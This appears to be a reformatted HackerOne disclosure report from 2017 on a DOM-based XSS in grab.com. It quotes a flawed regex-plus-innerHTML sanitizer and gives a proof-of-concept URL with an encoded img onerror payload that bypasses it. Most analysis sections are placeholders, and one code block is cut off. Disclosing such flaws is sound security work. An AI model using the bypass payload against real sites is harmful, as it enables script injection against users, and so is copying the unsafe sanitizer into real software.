# Dom based xss affecting all pages from https://www.grab.com/.

## Metadata
- **Source:** HackerOne
- **Report:** 247246 | https://hackerone.com/reports/247246
- **Submitted:** 2017-07-08
- **Reporter:** netfuzzer
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - DOM
- **CVEs:** None
- **Category:** web-api

## Summary
Hello,

there's a dom based xss vulnerability affecting all pages under the domain https://www.grab.com/.
This vulnerability wasn't properly patched so I managed to bypass the regular expressioned that was added into the function.

Vulnerable code:
````
var stripHtml = (function () {
		  var div = document.createElement('div');
		  return function (html) {
		    div.innerHTML = html.replace(/<\/?\

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello,

there's a dom based xss vulnerability affecting all pages under the domain https://www.grab.com/.
This vulnerability wasn't properly patched so I managed to bypass the regular expressioned that was added into the function.

Vulnerable code:
````
var stripHtml = (function () {
		  var div = document.createElement('div');
		  return function (html) {
		    div.innerHTML = html.replace(/<\/?\w+[^>]*\/?>/g, "");
		    return (div.innerText || div.textContent); // textContent is for firefox
		  };
		})();
``````

PoC: https://www.grab.com/sg/partnerships/?xss=%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E

visit url above to reproduce.

A screenshot is attached to this report.

cheers,
Mario.

</details>

---
*Analysed by Claude on 2026-05-12*
